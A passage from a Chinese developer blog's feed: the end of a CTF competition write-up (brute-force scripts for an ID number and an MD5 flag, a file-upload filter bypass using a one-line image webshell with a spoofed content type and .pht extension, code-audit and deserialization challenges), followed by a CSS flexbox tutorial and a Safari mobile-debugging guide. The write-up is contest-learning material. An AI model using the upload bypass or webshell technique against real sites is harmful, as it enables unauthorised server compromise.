class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">str = <span class="string">'14010619841%s%s%s%s812'</span> % (i,j,k,m)</span><br><span class="line">checkIdcard(str)</span><br></pre></td></tr></table></figure><p>最后跑出来：<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/92346919.jpg" alt=""></p><p>######0x03 xxx(题目太多，记得不清)<br>题目是:<code>随手加密了个md5——c44c6bfe1ba4ca9a3fd4df785eb8440e，只想着明文是：flag{xxxx_hello_world_xxxxx}这种格式，xxxx是1000-9999之内数字，xxxxx是60000-99999之间的数字</code>。写个小脚本跑出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">'c44c6bfe1ba4ca9a3fd4df785eb8440e'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> range(<span class="number">60000</span>,<span class="number">99999</span>):</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        b = <span class="string">'flag&#123;%04d_hello_world_%05d&#125;'</span>%(i1,i2)</span><br><span class="line">        md5.update(b)</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest() == a:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%s   %s'</span> %(md5.hexdigest() b)</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/65035307.jpg" alt=""></p><p>######0x04 上传绕过<br>直接上传一个一句话图片木马，<code>content-type</code>改成<code>image</code>形式，<code>filename</code>改成<code>pht</code>绕过：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/86816367.jpg" alt=""></p><p>######0x05 PS拼接<br>题目给了:<img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/48983431.jpg" alt="">，根据二维码生成特点，应该是有三个”回”字形，所以，左上角那个小的块，应该是要放大的。然后把每个块弄成透明，拼在一起：<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/88359469.jpg" alt=""><br>解出来<code>flag{eecece36874e068e18df9e565351bd53}</code></p><p>######0x06 web代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$IsMatch= preg_match(<span class="string">"/hongya.*ho.*ngya.&#123;4&#125;hongya&#123;3&#125;:\/.\/(.*hongya)/i"</span>, trim($_POST[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IsMatch )&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接绕过:</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/89508151.jpg" alt=""></p><p>######0x07 代码审计</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/66541493.jpg" alt=""></p><p>序列化问题，先写个php序列化程序读取文件：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/10891244.jpg" alt=""></p><p>######0x08 Misc2<br>修复一下PNG头，得到:</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/61045325.jpg" alt=""></p><p>######中间有很多题忘记了，说下渗透3吧<br> 前两个队员直接拿到系统权限，创建了用户，交了flag,flag3是一个加密的rar，先说是6位的爆了好久都没有·出来，最后比赛结束，说是4位的于是就出来了。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/21571959.jpg" alt=""><br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/38692080.jpg" alt=""></p><p>最后是第11名，拿了三等奖。认识自身不足，以后加以改进。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/56826209.jpg" alt=""><br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/4223876.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/88204668.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;#####2016年5月27号(比赛前夜)&lt;br&gt;比赛前一天晚上，入驻&lt;code&gt;陕西电子商务酒店&lt;/c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSS3中Flex布局实例demo</title>
    <link href="https://www.ycjcl.cc/2018/07/08/CSS3%E4%B8%ADFlex%E5%B8%83%E5%B1%80%E5%AE%9E%E4%BE%8Bdemo/"/>
    <id>https://www.ycjcl.cc/2018/07/08/CSS3中Flex布局实例demo/</id>
    <published>2018-07-07T17:11:19.000Z</published>
    <updated>2018-07-07T17:11:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>很多大牛，都提到了<code>flex</code>布局，说是css快速布局的新利器。于是学习了一下。</p></blockquote><p>教程，我推荐<strong>阮一峰</strong>老师的文章。老师分别写了<a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex 布局教程：语法篇</a>、<a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html" target="_blank" rel="noopener">Flex 布局教程：实例篇</a>。我跟着老师的文章，动手做了几个实例，体会了一下<code>flex</code>布局，简直是太方便了。</p><hr><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-1-4/97496200-file_1483539131458_1421c.png" alt=""></p><p>flex容器属性：</p><ul><li><code>flex-direction</code>：决定元素的排列方向</li><li><code>flex-wrap</code>：决定元素如何换行(排列不下时)</li><li><code>flex-flow</code> <code>flex-direction</code>和<code>flex-wrap</code>的简写</li><li><code>justify-content</code>：元素在主轴上的对齐方式</li><li><code>align-items</code>：元素在交叉轴的对齐方式</li></ul><blockquote><p><code>flex-direction: columns</code>其实是将默认情况下的<code>row</code>，逆时针旋转90度。</p></blockquote><p>flex元素属性：</p><ul><li><code>flex-grow</code>：当有多余空间时，元素的放大比例</li><li><code>flex-shrink</code>：当空间不足时，元素的缩小比例</li><li><code>flex-basis</code>：元素在主轴上占据的空间</li><li><code>flex</code>是<code>grow、shrink、basis</code>的简写</li><li><code>order</code>：定义元素的排列顺序</li><li><code>align-self</code>：定义元素自身的交叉轴对齐方式</li></ul><p>####Demo1<br>实现<code>flex item</code>的各种居中、对齐、位置：</p><p>html骨架结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化后是这样的：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/60548568.jpg" alt=""></p><p>如果我想让黑色的圆垂直居中的话，我就这样写了：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">justify-content</span>: center;</span><br><span class="line"><span class="attribute">align-items</span>: center;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/85911727.jpg" alt=""></p><p>####Demo2</p><p>多个黑色的球：</p><p>html结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"item one"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"item two"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"item three"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.one</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.two</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.three</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/71086070.jpg" alt=""></p><p>当css改变：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">justify-content</span>: space-between;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>球将均匀分开(和上面的一样)：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/6046671.jpg" alt=""></p><p>如果再改变下主轴方向<code>flex-direction:column;</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/12547629.jpg" alt=""></p><p>再弄个斜对角:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">justify-content</span>: space-between;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">flex-direction</span>:column;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.one</span>&#123;</span><br><span class="line"><span class="comment">/* align-self: flex-start;  其实是默认的 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.two</span>&#123;</span><br><span class="line"><span class="attribute">align-self</span>:center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.three</span>&#123;</span><br><span class="line"><span class="attribute">align-self</span>:flex-end;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/82841544.jpg" alt=""></p><p>####Demo3-网格布局<br>网格大概是这种的：<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/72746650.jpg" alt=""></p><p>html结构:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span>&gt;</span>111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span>&gt;</span>222<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span>&gt;</span>333<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span>&gt;</span>444<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.gird</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">display</span>: -webkit-flex;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grid-cell</span>&#123;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出来的效果是这样的：<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/38476854.jpg" alt=""></p><p>然后更改项目的<code>flex</code>配比，可以获得不同的空间。</p><p>html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span> <span class="attr">id</span>=<span class="string">"one"</span>&gt;</span>111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span> <span class="attr">id</span>=<span class="string">"two"</span>&gt;</span>222<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span> <span class="attr">id</span>=<span class="string">"three"</span>&gt;</span>333<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-cell"</span> <span class="attr">id</span>=<span class="string">"four"</span>&gt;</span>444<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#one</span>&#123;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#two</span>&#123;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#three</span>&#123;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#four</span>&#123;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-25/91878061.jpg" alt=""></p><blockquote><p>flex:0;  其实代表着宽高auto，自适应。如果flex: a b c;  a值是空间配比，b值是缩小的比例（若为0，则不缩放），c值是宽度(width) 或 高度(height)</p></blockquote><h3 id="实战"><a href="#实战" class="headerlink" title="实战:"></a>实战:</h3><h4 id="一、手机页面"><a href="#一、手机页面" class="headerlink" title="一、手机页面"></a>一、手机页面</h4><script async src="//jsfiddle.net/ycjcl868/9do06LdL/6/embed/result,html,css/"></script><h4 id="二、圣杯布局"><a href="#二、圣杯布局" class="headerlink" title="二、圣杯布局"></a>二、圣杯布局</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout/Using_CSS_flexible_boxes#圣杯布局示例" target="_blank" rel="noopener">MDN官方圣杯示例</a></p><script async src="//jsfiddle.net/ycjcl868/9do06LdL/15/embed/result,html,css/"></script><h4 id="二、产品列表"><a href="#二、产品列表" class="headerlink" title="二、产品列表"></a>二、产品列表</h4><script async src="//jsfiddle.net/ycjcl868/9do06LdL/7/embed/result,html,css/"></script><h4 id="三、PC页面布局"><a href="#三、PC页面布局" class="headerlink" title="三、PC页面布局"></a>三、PC页面布局</h4><script async src="//jsfiddle.net/ycjcl868/9do06LdL/8/embed/result,html,css/"></script><h4 id="四、完美居中"><a href="#四、完美居中" class="headerlink" title="四、完美居中"></a>四、完美居中</h4><script async src="//jsfiddle.net/ycjcl868/9do06LdL/9/embed/result,html,css/"></script><blockquote><p>资料：<a href="https://mp.weixin.qq.com/s?__biz=MzA5Njc3Njk5NA==&amp;mid=2650529122&amp;idx=1&amp;sn=d87231facb9d13e55e39b3ebc927f943&amp;chksm=88a59b2fbfd2123965e60b78b7b8ffa5c8a8bd3c91208c592a91a807f8354a50cdc80fb9c634&amp;scene=0&amp;key=f5988406d54d074e0b40d7aa25898f604df94f9cf10df367d1d2ea2880a6ccc392917257e5b4a1f8469980dcc914223465ea4dcd7df0f354af0c5e279e78a996017636d86d03cea88243f595c9c65c67&amp;ascene=0&amp;uin=MjA0MzUxMzA2Mw%3D%3D&amp;devicetype=iMac+MacBookPro12%2C1+OSX+OSX+10.12.1+build(16B2657" target="_blank" rel="noopener">一劳永逸的搞定 flex 布局</a>&amp;version=12020510&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=%2BSBoJPwi2t8B7iYV9WC6%2BYFk%2B%2Fqog7%2FSEAhrxbvVxkeXjlzhYSzcd0iXHEsx74n8)</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;很多大牛，都提到了&lt;code&gt;flex&lt;/code&gt;布局，说是css快速布局的新利器。于是学习了一下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;教程，我推荐&lt;strong&gt;阮一峰&lt;/strong&gt;老师的文章。老师分别写了&lt;a href=&quot;http
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Safari进行真机调试本地Web应用-实践</title>
    <link href="https://www.ycjcl.cc/2018/07/08/Safari%E8%BF%9B%E8%A1%8C%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E6%9C%AC%E5%9C%B0Web%E5%BA%94%E7%94%A8-%E5%AE%9E%E8%B7%B5/"/>
    <id>https://www.ycjcl.cc/2018/07/08/Safari进行真机调试本地Web应用-实践/</id>
    <published>2018-07-07T17:10:12.000Z</published>
    <updated>2018-07-07T17:10:44.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="真机调试本地Web应用-实践"><a href="#真机调试本地Web应用-实践" class="headerlink" title="真机调试本地Web应用-实践"></a>真机调试本地Web应用-实践</h4><blockquote><p>之前，移动端的开发测试一直是很头痛的问题。通常的测试方法是使用Chrome模拟器，但模拟器对移动端手势操作的测试几乎束手无策。</p></blockquote><p>然后就实践了一下<code>Safari</code>真机本地调试web应用。</p><ul><li>首先打开将<em>真机</em>和<em>电脑</em>置于同一网段下，对<em>手机</em>进行如下配置：<code>设置</code>-&gt; <code>Safari</code> -&gt; <code>高级</code> ，将<code>Web检查器</code>开启。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-7/59450549.jpg" alt="">，而<em>电脑</em>端，将<code>Safari</code>进行以下配置：<code>偏好设置</code> -&gt; <code>高级</code> -&gt; <code>在菜单栏中显示『开发』菜单</code><br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-7/39241933.jpg" alt=""></li><li>然后将用USB线将<em>手机</em>和<em>电脑</em>连接起来</li><li>这时候，用<em>手机</em>的<code>Safari</code>打开网页时，就会看到<em>电脑</em>的<code>Safari</code>有如下变化：<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-7/69280545.jpg" alt=""></li><li>点击进入后，作为前端来说看到这些，就知道怎样调试了，不再累述。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-7/71196810.jpg" alt=""><br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-7/85549723.jpg" alt=""></li><li><code>Safari</code>移动调试器真的是太强大了。。。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-7/86931823.jpg" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;真机调试本地Web应用-实践&quot;&gt;&lt;a href=&quot;#真机调试本地Web应用-实践&quot; class=&quot;headerlink&quot; title=&quot;真机调试本地Web应用-实践&quot;&gt;&lt;/a&gt;真机调试本地Web应用-实践&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;之前，移动端的开发
      
    
    </summary>
    
    
  </entry>
  
</feed>
